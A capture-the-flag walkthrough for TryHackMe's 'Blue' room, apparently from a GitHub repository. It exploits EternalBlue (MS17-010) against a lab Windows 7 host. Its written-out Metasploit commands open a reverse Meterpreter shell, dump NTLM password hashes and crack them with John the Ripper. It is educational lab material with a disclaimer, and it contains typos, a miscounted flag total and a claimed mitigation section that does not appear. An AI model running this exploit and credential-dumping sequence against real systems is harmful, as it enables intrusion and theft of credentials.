# 💥 TryHackMe: Blue – EternalBlue Exploitation Walkthrough

Room Link: [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)  
Difficulty: Beginner  
Focus: MS17-010 Vulnerability (EternalBlue)

---

## 🔌 0. VPN Setup on Kali Linux (TryHackMe)

Before anything, connect to the TryHackMe network using OpenVPN.

### 📥 Download your VPN configuration file

1. Log in to [TryHackMe](https://tryhackme.com/)
2. Go to the **Access** page
3. Click **Download My Configuration File** (usually ends in `.ovpn`)

## 📂 Move the file to your system

If downloaded, Go to `Downloads` folder in your distro:
```bash
cd Downloads
```
## 🔐 Now Connect using OpenVPN 

```bash
sudo openvpn <select the downloaded file in folder>
```
![vpn configuration](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/vpn%20configuration.png?raw=true)
Next step,
## 📡 1. Network Scanning & Enumeration
### 🔍 Port Scanning with Nmap
```bash
nmap -sC -sV --sript vuln <TARGET_IP>
```
![nmap the TARGET ip](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/nmap.png?raw=true)

Sample output shows ports: 135, 139, 445 — indicating SMB is active.Sample output shows ports: 135, 139, 445 — indicating SMB is active.

## ⚔️ Step 2: Exploitation with Metasploit

We will now exploit the target using the MS17-010 (EternalBlue) vulnerability via Metasploit.

### 🧩 Launch Metasploit
```bash
msfconsole
```

![launching metasploit](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/msfconsole.png?raw=true)

Once inside Metasploit, search for the exploit module:

```bash
search eternal blue
```

![searching eternal blue in msf](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/Search.png?raw=true)

Select the first of the options shows;

```bash
use0
<next>
options
```

![msf console options](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/options.png?raw=true)

We can see the LHOSTS and RHOSTS are need to acquire the required IP Address of each;
So, set RHOSTS the <TARGET_IP> and LHOST must be the ip of ur vpn;

```bash
set RHOSTS <TARGET_IP>
set LHOST <YOUR_VPN_IP>
```

![assigning RHOSTS and LHOST](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/rhosts.png?raw=true  )

Then, We have to gain access in this system ; 
So, we have to Expoit.

```bash
exploit
```

![exploiting win](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/exploit.png?raw=true)

After exploiting, We can get the Meterpreter shell in metasploit framework.

## 🧪 Step 3: Post-Exploitation

### 🖥️ Verify Access and System Directory:

```bash
meterpreter > pwd
```
### 🔐 Dumping and Cracking Password Hashes:

Meterpreter session is activated, we can attempt to dump the user password hashes.

First, try using the built-in hash dumping command:

```bash
meterpreter > hashdump
```

![dumping hashes](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/Hashes.png?raw=true)

Save Hashes to a File, Copy and paste the output into a text file on your local machine,
e.g., pass.txt.

![saving hashes into text file](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/pass.png?raw=true)

Crack Hashes with John the Ripper Use the rockyou.txt wordlist to crack NTLM hashes:

```bash
john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```
![cracking hashes](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/john.png?raw=true)

After this, we need to find the flags.

## 🏳️ Flags

During post-exploitation, we discovered two flags in the victim's system that confirm successful access and lateral movement.

### Flag 1: Local Access Confirmation

We need to navigate to the root C:\ directory and locate the flag1.txt file.

```bash
meterpreter > cd ../../
```
List files:

```bash
meterpreter > ls
```

![listing directory](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/back_to_C.png?raw=true)

To open the flag:

```bash
meterpreter > cat flag1.txt
```

![flg1](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/flag1.png?raw=true)

### Flag 2: Deeper System Access

Flag 2 is found under system32 directory, such as: C:\Windows\System32\config\flag2.txt

Command:

 ```bash
meterpreter > cd C:\\Windows\\Sysyem32\\config
meterpreter > cat flag2.txt
```
![flag 2](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/flag2.png?raw=true)

###  Flag 3: User-Level Document Discovery

Flag 3 is found under a user directory, such as: C:\Users\jon\Documents\flag3.txt

Command:

```bash
meterpreter > cd C:\\Users\\jon\\Documents
meterpreter > ls
meterpreter > cat flag3.txt
```

![flag 3](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/flag3.png?raw=true)

## ✅ Conclusion

In this walkthrough, we successfully demonstrated a full exploitation workflow against a Windows 7 machine vulnerable to **MS17-010 (EternalBlue)** using **TryHackMe's "Blue" room**.

---

### 🔍 What We Did:

- 🔌 **Configured OpenVPN** to connect to TryHackMe’s network
- 📡 **Enumerated network services** using `nmap` to identify open ports
- 🧪 **Detected SMB vulnerability** (MS17-010) using Nmap NSE scripts
- 🎯 **Exploited the target** with Metasploit's EternalBlue module
- 🐚 **Gained a Meterpreter shell** for remote access and control
- 🚩 **Captured system flags** and answered room-specific questions
- 🛡️ **Outlined post-exploitation mitigation** techniques for real-world defense

---

### 🧠 Why This Matters

This simulation highlights how a single outdated protocol like **SMBv1**, if left unpatched, can allow attackers full system compromise — echoing real-world incidents like **WannaCry**.

Understanding EternalBlue is essential for both:
- ✅ **Red Teams**: to learn reliable exploitation techniques
- ✅ **Blue Teams**: to recognize and defend against legacy vulnerabilities

---

## ⚠️ Disclaimer

> 🛑 **This walkthrough is for educational and ethical purposes only.**  
> Do not use the techniques or tools demonstrated here on systems you do not own or have explicit permission to test.  
> This project was created for cybersecurity learning via the TryHackMe platform.

---

### 📌 Author Note

Feel free to fork, improve, or reference this writeup for your own learning and reporting.

🎓 Happy Hacking!



